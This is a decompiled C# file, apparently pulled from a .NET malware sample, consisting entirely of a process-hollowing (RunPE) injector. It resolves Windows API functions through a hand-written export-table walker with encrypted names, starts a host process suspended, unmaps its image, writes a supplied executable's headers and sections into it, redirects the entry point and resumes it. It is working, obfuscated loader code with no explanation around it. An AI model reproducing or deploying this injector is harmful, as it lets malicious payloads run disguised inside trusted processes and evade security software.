using System;
using System.Collections;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security;
using System.Text;
using Microsoft.VisualBasic.CompilerServices;

[SuppressUnmanagedCodeSecurity]
public class JN
{
	private delegate IntPtr TC(string name);

	[return: MarshalAs(UnmanagedType.Bool)]
	private delegate bool JO(string appName, StringBuilder commandLine, IntPtr procAttr, IntPtr thrAttr, [MarshalAs(UnmanagedType.Bool)] bool inherit, int creation, IntPtr env, string curDir, byte[] sInfo, IntPtr[] pInfo);

	[return: MarshalAs(UnmanagedType.Bool)]
	private delegate bool NN(IntPtr hThr, uint[] ctxt);

	private delegate uint XJ(IntPtr hProc, IntPtr baseAddr);

	[return: MarshalAs(UnmanagedType.Bool)]
	private delegate bool AL(IntPtr hProc, IntPtr baseAddr, ref IntPtr bufr, IntPtr bufrSize, ref IntPtr numRead);

	private delegate int _F(IntPtr hThr);

	[return: MarshalAs(UnmanagedType.Bool)]
	private delegate bool FZ(IntPtr hThr, uint[] ctxt);

	private delegate IntPtr _FU(IntPtr hProc, IntPtr addr, IntPtr size, int allocType, int prot);

	[return: MarshalAs(UnmanagedType.Bool)]
	private delegate bool OLX(IntPtr hProc, IntPtr addr, IntPtr size, int newProt, ref int oldProt);

	[return: MarshalAs(UnmanagedType.Bool)]
	private delegate bool HF(IntPtr hProc, IntPtr baseAddr, byte[] buff, IntPtr size, ref IntPtr numRead);

	private static readonly TC OJ_106 = X_G<TC>("kernel32", "LoadLibraryA");

	private static readonly int[] YD_107 = new int[8]
	{
		1,
		16,
		2,
		32,
		4,
		64,
		4,
		64
	};

	private static DelegateInstance X_G<DelegateInstance>(string UHF_221, string _UD_222)
	{
		//Discarded unreachable code: IL_003b, IL_004e
		//IL_0045: Expected O, but got I4
		DelegateInstance result = default(DelegateInstance);
		try
		{
			result = Conversions.ToGenericParameter<DelegateInstance>(Marshal.GetDelegateForFunctionPointer((IntPtr)WFY((long)FPE(UHF_221), _UD_222), typeof(DelegateInstance)));
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	private static IntPtr FPE(string AG_223)
	{
		//Discarded unreachable code: IL_0096, IL_00a9
		//IL_00a0: Expected O, but got I4
		if (!AG_223.Contains(O.I("9Exwi0W3fK/26edDb7Jm8g==")))
		{
			AG_223 += O.I("9Exwi0W3fK/26edDb7Jm8g==");
		}
		IntPtr intPtr = default(IntPtr);
		IEnumerator enumerator = default(IEnumerator);
		try
		{
			enumerator = Process.GetCurrentProcess().Modules.GetEnumerator();
			while (enumerator.MoveNext())
			{
				ProcessModule processModule = (ProcessModule)enumerator.Current;
				if (Operators.CompareString(processModule.ModuleName.ToLower(), AG_223, false) == 0)
				{
					return processModule.BaseAddress;
				}
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
		return OJ_106(AG_223);
	}

	private static byte[] MOU(IntPtr ZD_224, int LG_225)
	{
		//Discarded unreachable code: IL_0016, IL_0029
		//IL_0020: Expected O, but got I4
		//IL_0021: Expected O, but got I4
		byte[] array = new byte[checked(LG_225 - 1 + 1)];
		Marshal.Copy(ZD_224, array, 0, LG_225);
		return array;
	}

	private static long WFY(long YPR_226, string BV_227)
	{
		//Discarded unreachable code: IL_013c, IL_014f
		//IL_0146: Expected O, but got I4
		//IL_0147: Expected O, but got I4
		byte[] value = null;
		checked
		{
			if (IntPtr.Size == 4)
			{
				value = MOU((IntPtr)(YPR_226 + Marshal.ReadInt32((IntPtr)(YPR_226 + Marshal.ReadInt32((IntPtr)(YPR_226 + 60)) + 120)) + 24), 16);
			}
			if (IntPtr.Size == 8)
			{
				value = MOU((IntPtr)(YPR_226 + Marshal.ReadInt32((IntPtr)(YPR_226 + Marshal.ReadInt32((IntPtr)(YPR_226 + 60)) + 136)) + 24), 16);
			}
			int num = BitConverter.ToInt32(value, 0);
			for (int i = 0; i <= num; i++)
			{
				int num2 = Marshal.ReadInt32((IntPtr)(BitConverter.ToInt32(value, 8) + YPR_226 + i * 4));
				string left = Encoding.ASCII.GetString(MOU((IntPtr)(YPR_226 + num2), 64)).Split('\0')[0];
				int num3 = BitConverter.ToInt16(MOU((IntPtr)(BitConverter.ToInt32(value, 12) + YPR_226 + i * 2), 2), 0);
				if (Operators.CompareString(left, BV_227, false) == 0)
				{
					return BitConverter.ToInt32(MOU((IntPtr)(BitConverter.ToInt32(value, 4) + YPR_226 + num3 * 4), 4), 0) + YPR_226;
				}
			}
			return 0L;
		}
	}

	public static void QB_(byte[] QIT_228, string BL_229)
	{
		//Discarded unreachable code: IL_03b5, IL_03c8
		//IL_03bf: Expected O, but got I4
		if (Operators.CompareString(BL_229, null, false) == 0)
		{
			BL_229 = RuntimeEnvironment.GetRuntimeDirectory() + O.I("u/kmrYrQevGpUj3toll5Yw==");
		}
		JO jO = X_G<JO>(O.I("tJqx37YHPrr3pSzFdH0lCg=="), O.I("KeDhUoxa7gY0o/ukGnHVAg=="));
		NN nN = X_G<NN>(O.I("tJqx37YHPrr3pSzFdH0lCg=="), O.I("cNIAlTQA01/KjOY13uy9W2/bTHRxuCIHObrYFvGN45w="));
		XJ xJ = X_G<XJ>(O.I("mCrU9SslNOCpmfSZMVo83w=="), O.I("2dA5A2tl5IS0RMtIpR/Am08odAwf602uxA0TmBSV9iw="));
		AL aL = X_G<AL>(O.I("tJqx37YHPrr3pSzFdH0lCg=="), O.I("AO2MthwlZPGkc5wQs5d2VceFvnj1bHW6v5AE0H4X4Xw="));
		_F f = X_G<_F>(O.I("tJqx37YHPrr3pSzFdH0lCg=="), O.I("40dxk8o/CaG3rT0fumtuqA=="));
		FZ fZ = X_G<FZ>(O.I("tJqx37YHPrr3pSzFdH0lCg=="), O.I("yQIST1iZvHfcvejv7O43hMsOdm2eIuEEOoWNJ0ZdVaM="));
		_FU fU = X_G<_FU>(O.I("tJqx37YHPrr3pSzFdH0lCg=="), O.I("PmQpm+GQ5YvPot2lA+1coQ=="));
		OLX oLX = X_G<OLX>(O.I("tJqx37YHPrr3pSzFdH0lCg=="), O.I("dRxixE06aty6OyowekKwFROTegPJjqv4wLofU+KIx1Q="));
		HF hF = X_G<HF>(O.I("tJqx37YHPrr3pSzFdH0lCg=="), O.I("BWNWp0Fx8QSOKx857DmkGurzR/p5w9ybXZKQ9dE9F7Q="));
		int num = BitConverter.ToInt32(QIT_228, 60);
		checked
		{
			int num2 = BitConverter.ToInt16(QIT_228, num + 6);
			IntPtr size = new IntPtr(BitConverter.ToInt32(QIT_228, num + 84));
			byte[] sInfo = new byte[68];
			IntPtr[] array = new IntPtr[4];
			IntPtr intPtr = default(IntPtr);
			if (!jO(null, new StringBuilder(BL_229), intPtr, intPtr, false, 4, intPtr, null, sInfo, array))
			{
				return;
			}
			uint[] array2 = new uint[179];
			array2[0] = 65538u;
			if (nN(array[1], array2))
			{
				IntPtr hProc = array[0];
				IntPtr baseAddr = new IntPtr(unchecked((long)array2[41]) + 8L);
				IntPtr bufrSize = new IntPtr(4);
				IntPtr bufr = default(IntPtr);
				IntPtr numRead = default(IntPtr);
				if (aL(hProc, baseAddr, ref bufr, bufrSize, ref numRead) && unchecked((ulong)xJ(array[0], bufr)) == 0)
				{
					IntPtr hProc2 = array[0];
					IntPtr intPtr2 = new IntPtr(BitConverter.ToInt32(QIT_228, num + 52));
					IntPtr addr = intPtr2;
					IntPtr size2 = new IntPtr(BitConverter.ToInt32(QIT_228, num + 80));
					IntPtr baseAddr2 = fU(hProc2, addr, size2, 12288, 64);
					bool flag = hF(array[0], baseAddr2, QIT_228, size, ref numRead);
					int num3 = num2 - 1;
					int oldProt = default(int);
					for (int i = 0; i <= num3; i++)
					{
						int[] array3 = new int[10];
						Buffer.BlockCopy(QIT_228, num + 248 + i * 40, array3, 0, 40);
						byte[] array4 = new byte[array3[4] - 1 + 1];
						Buffer.BlockCopy(QIT_228, array3[5], array4, 0, array4.Length);
						IntPtr hProc3 = array[0];
						size2 = new IntPtr(baseAddr2.ToInt32() + array3[3]);
						IntPtr baseAddr3 = size2;
						intPtr2 = new IntPtr(array4.Length);
						flag = hF(hProc3, baseAddr3, array4, intPtr2, ref numRead);
						IntPtr hProc4 = array[0];
						size2 = new IntPtr(baseAddr2.ToInt32() + array3[3]);
						IntPtr addr2 = size2;
						intPtr2 = new IntPtr(array3[2]);
						flag = oLX(hProc4, addr2, intPtr2, YD_107[(array3[9] >> 29) & 7], ref oldProt);
					}
					IntPtr hProc5 = array[0];
					size2 = new IntPtr(unchecked((long)array2[41]) + 8L);
					IntPtr baseAddr4 = size2;
					byte[] bytes = BitConverter.GetBytes(baseAddr2.ToInt32());
					intPtr2 = new IntPtr(4);
					flag = hF(hProc5, baseAddr4, bytes, intPtr2, ref numRead);
					array2[44] = (uint)(baseAddr2.ToInt32() + BitConverter.ToInt32(QIT_228, num + 40));
					fZ(array[1], array2);
				}
			}
			f(array[1]);
		}
	}
}
